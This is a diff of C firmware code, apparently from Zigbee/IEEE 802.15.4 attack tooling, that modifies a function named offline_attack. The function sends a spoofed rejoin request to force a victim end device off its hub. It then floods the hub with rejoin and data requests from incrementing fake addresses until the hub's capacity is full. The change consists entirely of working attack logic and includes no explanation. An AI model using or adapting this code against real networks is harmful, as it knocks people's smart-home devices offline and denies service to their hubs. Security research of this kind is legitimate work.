@@ -238,24 +238,30 @@ uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, 
 {
 	/** 1. Trigger ZED to leave and rejoin. **/
 	rx_aack_config aack_config = {};
-	aack_config.aack_flag = 0;
+	aack_config.aack_flag = 1;
 	aack_config.dis_ack = 0;
 	aack_config.pending = 0;
 	aack_config.target_short_addr.addr = victim_addr->short_addr;
 	aack_config.target_pan_id.addr = victim_addr->pan;
 
-	// Here we change the vicim rx type.
-	victim_addr->rx_when_idle = 1;
-	if (victim_addr->device_type == 1)
-	{
-		// TODO: Implement the Offline Attack logic for ZR
-		// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
-	}
-	else if (victim_addr->device_type == 2)
+	if (victim_addr->device_type == 2)
 	{
 		if (victim_addr->polling_type == 2)
 		{
-			send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
+			if (!victim_addr->rx_when_idle)
+			{
+				send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
+				_delay_us(100);
+				aack_config.aack_flag = 0;
+				send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, hub_addr, victim_addr, &aack_config);
+			}
+			else
+			{
+				aack_config.aack_flag = 0;
+				send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
+				// _delay_us(500);
+				// send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, hub_addr, victim_addr, &aack_config);
+			}
 		}
 		else if (victim_addr->polling_type == 1)
 		{
@@ -263,27 +269,24 @@ uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, 
 		}
 	}
 	/** 2. Launch capacity attack again **/
-	// Here we need to delay 1 second to wait for multiple Rejoin response finished.
-	_delay_us(500);
-	
+
 	ieee802154_addr ghost_addr = *victim_addr;
-	ghost_addr.short_addr = 0x1234;
+	ghost_addr.short_addr = 0x1345;
 	ghost_addr.long_addr = random_addr;
+	ghost_addr.rx_when_idle = 1;
 	aack_config.aack_flag = 1;
-	aack_config.target_short_addr.addr = ghost_addr.short_addr;
-	while (1)
+	rejoin_full_flag = 0;
+	while (!rejoin_full_flag)
 	{
-		ghost_addr.long_addr += 1;
-		ghost_addr.short_addr += 1;
 		aack_config.target_short_addr.addr = ghost_addr.short_addr;
 		send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, &ghost_addr, &aack_config);
 		if (ghost_addr.rx_when_idle == 0)
 		{
-			_delay_us(100);
 			send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, hub_addr, &ghost_addr, &aack_config);
 		}
-		_delay_ms(REJOIN_REQUEST_INTERVAL);
-
+		ghost_addr.long_addr += 1;
+		ghost_addr.short_addr += 1;
+		// _delay_ms(REJOIN_REQUEST_INTERVAL);
 	}
 	
 	return 1;
